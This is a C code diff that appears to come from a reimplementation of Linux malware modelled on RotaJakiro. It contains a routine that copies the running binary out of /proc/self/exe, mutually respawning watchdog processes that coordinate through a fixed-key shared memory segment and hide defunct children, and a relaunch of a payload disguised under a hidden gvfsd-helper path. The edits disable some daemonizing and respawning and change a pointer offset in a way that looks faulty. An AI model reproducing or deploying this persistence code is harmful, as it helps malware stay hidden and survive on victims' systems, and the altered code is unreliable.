@@ -22,7 +22,7 @@ bool copy_rota_to_userland(char *destpath) {
     stat("/proc/self/exe", &procstru);
     fsize = procstru.st_size;
     char *exe = (char *)malloc(fsize);
-    memset(exe,0, fsize);
+    memset(exe, 0, fsize);
 
     // copy data from /proc/self/exe into exe buffer.
     int fd  = open("/proc/self/exe", O_RDONLY);
@@ -363,12 +363,11 @@ void fork_exec(char *fpath) {
 
 
 void *watchdog_process_shmget(void *fpath) {
-
     // stop defunct processes from showing up
     signal(SIGCHLD, SIG_IGN);
 
     // detach from current console
-    daemon(0,0);
+    //daemon(0,0);
 
     bool proc_alive;
     int pid = getpid();
@@ -381,7 +380,7 @@ void *watchdog_process_shmget(void *fpath) {
                 strerror(errno));
         sleep(5);
         // recurisvely call watchdog in the event IPC shmem creation fails.
-        watchdog_process_shmget(fpath);
+        //watchdog_process_shmget(fpath);
     }
 
     // write PID to sharedmem
@@ -396,7 +395,7 @@ void *watchdog_process_shmget(void *fpath) {
         int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
 
         // get "upper bytes" from shmem
-        int upper_bytes = *(shmem_pid_addr+1);
+        int upper_bytes = *(shmem_pid_addr+4);
 
         #ifdef DEBUG
         fprintf(stdout,"[watchdog_process_shmget] PID from shared memory is: %d current pid is: %d\n",
@@ -422,7 +421,7 @@ void *watchdog_process_shmget(void *fpath) {
             close(f_pid);
         }
 
-        sleep(3);
+        sleep(5);
     } while(true);
 
 
@@ -436,12 +435,8 @@ void *watchdog_process_shmget(void *fpath) {
 
 
 void *watchdog_process_shmread(void *fpath) {
-
     // stop defunct processes from showing up
     signal(SIGCHLD, SIG_IGN);
-
-    // detach from current console
-    daemon(0,0);
 
     bool proc_alive;
 
@@ -450,25 +445,19 @@ void *watchdog_process_shmread(void *fpath) {
         int shmid = shmget(0x64b2e2, 8, 0666);
         if (shmid <= 0) {
             #ifdef DEBUG
-            fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(),strerror(errno));
-            fprintf(stderr, "\n[watchdog_process_shmread] sleeping...\n");
+            fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(), strerror(errno));
             #endif
-            // prevent seg fault
-            sleep(3);
-            //TODO call this program recursively...
         }
 
 
         // write PID to sharedmem
         int pid = getpid();
-        void *addr = shmat(shmid, NULL, 0);
+        int *addr = shmat(shmid, NULL, 0);
         memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes.:
 
-        /*
         #ifdef DEBUG
         fprintf(stdout, "\n[wathcdog_process_shmread] wrote %d to shared memory\n", getpid());
         #endif
-        */
 
         // get pid from shared memory.
         int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
@@ -492,17 +481,19 @@ void *watchdog_process_shmread(void *fpath) {
 
             // TODO - stack string file path  and dynamically resolve it.
             char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
+            /*
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
             }
             close(f_pid);
+            */
         }
 
         sleep(3);
     } while(true);
 
-    pthread_detach(pthread_self());
+   pthread_detach(pthread_self());
 }
 
 void spawn_thread_watchdog(int uid, char *fpath) {
@@ -511,8 +502,7 @@ void spawn_thread_watchdog(int uid, char *fpath) {
         // the "parent thread" monitors session-dbus
         //pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
          watchdog_process_shmget(fpath);
-        //
-        //
+
         // testing
     } else {
         // the "child thread" monitors gvfsd-helper
